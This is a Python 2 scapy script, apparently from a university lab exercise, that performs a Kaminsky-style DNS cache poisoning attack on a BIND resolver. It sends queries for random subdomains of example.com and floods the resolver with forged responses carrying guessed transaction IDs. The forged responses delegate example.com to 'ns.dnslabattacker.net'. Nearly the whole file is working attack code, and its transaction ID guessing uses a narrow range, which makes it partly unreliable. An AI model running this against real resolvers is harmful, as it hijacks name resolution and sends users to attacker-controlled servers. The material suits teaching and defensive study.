#!/usr/bin/env python2
import argparse
import socket

from scapy.all import *
from random import randint, choice
from string import ascii_lowercase, digits
from subprocess import call


parser = argparse.ArgumentParser()
parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
parser.add_argument("--port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int, required=False)
parser.add_argument("--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
args = parser.parse_args()

# your bind's ip address
my_ip = args.ip
# your bind's port (DNS queries are send to this port)
my_port = args.port
# BIND's port
dns_port = args.dns_port
# port that your bind uses to send its DNS queries
my_query_port = args.query_port

#python2 dnsproxy_starter.py --port <PROXY port number> --dns_port <NAMED port number>.
#python2 dnsproxy_starter.py --port 4704 --dns_port 4702
print(my_ip, my_port, dns_port, my_query_port)

# print("gereasdsadsadasd")

'''
Generates random strings of length 10.
'''
def getRandomSubDomain():
	return ''.join(choice(ascii_lowercase + digits) for _ in range (10))

'''
Generates random 8-bit integer.
'''
def getRandomTXID():
	return randint(0, 256)

'''
Sends a UDP packet.
'''
def sendPacket(sock, packet, ip, port):
    sock.sendto(str(packet), (ip, port))

'''
Example code that sends a DNS query using scapy.
'''
def exampleSendDNSQuery():
    sock_query = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock_respon = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    while True:
        random_domain = getRandomSubDomain() + ".example.com"
        query = DNS(rd=1, qd=DNSQR(qname=random_domain))
        sendPacket(sock_query,query,my_ip,my_port)
        for i in range(50):
            fake_resp = DNS(id=getRandomTXID(), qr=1, aa=1, qd=DNSQR(qname=random_domain), an=DNSRR(rrname=random_domain, type='A', ttl=75000, rdata='1.1.1.1'), ns=DNSRR(rrname='example.com', type='NS', ttl=150000, rdata='ns.dnslabattacker.net'))
            sendPacket(sock_respon, fake_resp, my_ip, my_query_port)
        query_respon, bind = sock_query.recvfrom(4096)
        if DNS(query_respon).ancount > 0:
            print("successful")
            break
    sock_query.close()    
    sock_respon.close()             
    

if __name__ == '__main__':
    exampleSendDNSQuery()
